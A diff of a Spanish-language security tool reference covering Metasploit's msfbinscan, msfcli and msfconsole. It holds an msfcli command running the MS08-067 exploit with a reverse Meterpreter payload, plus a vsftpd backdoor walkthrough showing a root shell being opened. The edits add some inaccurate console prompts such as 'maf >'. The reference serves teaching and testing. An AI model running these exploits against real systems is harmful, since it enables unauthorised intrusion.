@@ -16152,6 +16152,17 @@ Opciones:
 -fg white (color de fuente)
 
 
+msfbinscan
+Utilidad para analizar archivos binarios y detectar patrones que podrían corresponder a payloads generados con Metasploit.
+# msfbinscan -o -f archivo.bin -s .text (despliega la salida en formato detallado y analizaría la sección .text del archivo en busca de shellcode o patrones conocidos)
+
+
+msfcli
+Interfaz de línea de comandos que permite ejecutar exploits y módulos directamente sin entrar en msfconsole que lo ha reemplazado.
+# msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 E (usando el exploit que afecta a sistemas Windows a través de SMB, el payload que genera una sesión de Meterpreter inversa, LHOST la dirección IP del atacante, LPORT es el puerto esperando la conexión inversa y la opción E ejecuta el exploit)
+# msfcli exploit/windows/smb/ms08_067_netapi O (muestra las opciones del payload)
+
+
 msfconsole
 [metasploit]. Consola centralizada con acceso a todo las opciones disponibles de Metasploit Framework, única soportada y estable con soporte para de edición de lineas (readline), que permite tabulacion y ejecución de comandos externos.
 	msf > ping -c 1 192.168.1.10 (usar ping)
@@ -16196,30 +16207,25 @@ Algunos comandos relacionados con la base de datos propia de metasploit:
 	msf > services -u -R 192.168.1.10 (Muestra los servicios activos [u] del host especificado [R])
 3.-
 Ejemplo de muestra de un scan de puertos:
-	Exploradores de puertos disponibles:
-		msf > search portscan
+	msf > search portscan (exploradores de puertos disponibles)
 	Nota.- Los escáners y la mayoría de módulos auxiliares usan la opción RHOSTS en vez de RHOST y puede ser un rango de IP [192.168.1.10-192.168.1.50], rangos CIDR (192.168.1.0/24), múltiples rangos separados por comas (192.168.1.0/24, 192.168.3.0/24) y una lista en un archivo con una ip por linea (file:/tmp/hostlist.txt).
-	Para escoger el escaneador de puertos a usar:
-		msf > use scanner/portscan/tcp
-	Comprobar si falta algún parámetro [RHOSTS]
-		msf auxiliary(tcp) > show options
-	Entrar la ip donde dirigir el escaneo:
-		msf auxiliary(tcp) > set RHOSTS 192.168.1.10
-	Arancar el escaneo:
-		msf auxiliary(tcp) > run
-Todos los módulos scanner tiene el valor THREADS en "1". Este valor establece el número de subprocesos simultaneos que se utilizan durante la exploración. Un número superior acelera las exploraciones pero aumenta el tráfico en la red. Para modificar el valor:
-	msf > set THREADS 50
+	msf > use scanner/portscan/tcp ((para escoger el escaneador de puertos a usar)
+	msf > auxiliary(tcp) > show options (comprobar si falta algún parámetro [RHOSTS])
+	msf > auxiliary(tcp) > set RHOSTS 192.168.1.10 (entrar la ip donde dirigir el escaneo)
+	msf > auxiliary(tcp) > run (arancar el escaneo)
+Todos los módulos scanner tiene el valor THREADS en "1". Este valor establece el número de subprocesos simultaneos que se utilizan durante la exploración. Un número superior acelera las exploraciones pero aumenta el tráfico en la red.
+	msf > set THREADS 50 (para modificar el valor)
 4.-
 Ejemplo de muestra de un ataque
-MSF > use exploit/unix/ftp/vsftpd_234_backdoor
+        maf > use exploit/unix/ftp/vsftpd_234_backdoor
 Comprobar parámetros que faltan:
-	msf exploit(vsftpd_234_backdoor) > show options
+	msf > exploit(vsftpd_234_backdoor) > show options
 Entrar el parámetro RHOST [la IP atacada]
-	msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.1.10
+	msf > exploit(vsftpd_234_backdoor) > set RHOST 192.168.1.10
 Comprobar nuevamente si el parámetro ha entrado correctamente:
-	msf exploit(vsftpd_234_backdoor) > show options
+	msf > exploit(vsftpd_234_backdoor) > show options
 Lanzar el exploit en segundo plano [j] y mostrando una salida positiva en la que se abre una shell en la máquina remota:
-	msf exploit(vsftpd_234_backdoor) > exploit -j
+	msf > exploit(vsftpd_234_backdoor) > exploit -j
 	[*] Exploit running as background job.
 	[*] Banner: 220 (vsFTPD 2.3.4)
 	[*] USERR: 331 Please specify the password.
@@ -16227,25 +16233,11 @@ Lanzar el exploit en segundo plano [j] y mostrando una salida positiva en la que
 	[+] UID: uid=0(root) gid=0(root)
 	[*] Found shell.
 	[*] Command shell session 1 opened (192.168.1.15:49654 -> 192.168.1.10:6200) at 2013-07-07 08:06:30 -0400
-Mostrar las sesiones abiertas [ID de la sesion, puertos abiertos, máquina remota, local...]:
-	msf exploit(vsftpd_234_backdoor) > sessions -l
-Ejecutar un comando en todas las shells abiertas y mostradas con sessions -l:
-	msf exploit(vsftpd_234_backdoor) > sessions -c ifconfig
-Entrar en la session con ID 1:
-	msf exploit(vsftpd_234_backdoor) > sessions -i 1
+	msf > exploit(vsftpd_234_backdoor) > sessions -l (mostrar las sesiones abiertas [ID de la sesion, puertos abiertos, máquina remota, local...])
+	msf > exploit(vsftpd_234_backdoor) > sessions -c ifconfig (ejecutar un comando en todas las shells abiertas y mostradas con sessions -l)
+	msf > exploit(vsftpd_234_backdoor) > sessions -i 1 (entrar en la session con ID 1)
 	[*] Starting interaction with 1...
 A partir de este punto estamos en una shell clásica de linux del host 192.168.1.10 donde podemos usar todos los comandos propios de dichas shells.
-
-
-msfbinscan
-Utilidad para analizar archivos binarios y detectar patrones que podrían corresponder a payloads generados con Metasploit.
-# msfbinscan -o -f archivo.bin -s .text (despliega la salida en formato detallado y analizaría la sección .text del archivo en busca de shellcode o patrones conocidos)
-
-
-msfcli
-Interfaz de línea de comandos que permite ejecutar exploits y módulos directamente sin entrar en msfconsole que lo ha reemplazado.
-# msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 E (usando el exploit que afecta a sistemas Windows a través de SMB, el payload que genera una sesión de Meterpreter inversa, LHOST la dirección IP del atacante, LPORT es el puerto esperando la conexión inversa y la opción E ejecuta el exploit)
-# msfcli exploit/windows/smb/ms08_067_netapi O (muestra las opciones del payload)
 
 
 msfd
